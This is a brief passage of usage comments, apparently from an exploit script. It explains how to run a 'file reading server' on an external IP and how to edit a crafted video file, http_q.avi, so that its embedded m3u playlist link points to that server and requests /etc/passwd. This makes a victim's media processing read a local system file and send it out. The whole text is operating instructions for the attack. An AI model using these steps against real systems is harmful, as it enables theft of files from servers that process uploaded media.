...
#usage: python3 file_reading_server.py --external-addr <external-ip-of-your-server> --port 8080
#modify http_q.avi so the link inside it will point to your server and be like this: http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd
